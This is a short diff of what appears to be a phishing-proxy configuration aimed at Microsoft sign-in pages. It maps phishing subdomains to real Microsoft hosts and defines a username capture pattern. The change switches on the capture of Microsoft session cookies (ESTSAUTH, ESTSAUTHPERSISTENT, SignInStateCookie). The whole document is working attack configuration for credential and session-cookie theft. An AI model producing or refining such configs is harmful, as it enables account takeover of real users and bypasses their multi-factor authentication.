@@ -10,8 +10,8 @@ proxy_hosts:
   - {phish_sub: 'cdn', orig_sub: 'logincdn', domain: 'msauth.net', session: true, is_landing: false}
 
 auth_tokens:
-#  - domain: '.login.microsoftonline.com'
-#    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie']
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie']
 credentials:
   username:
     key: '(login|UserName)'
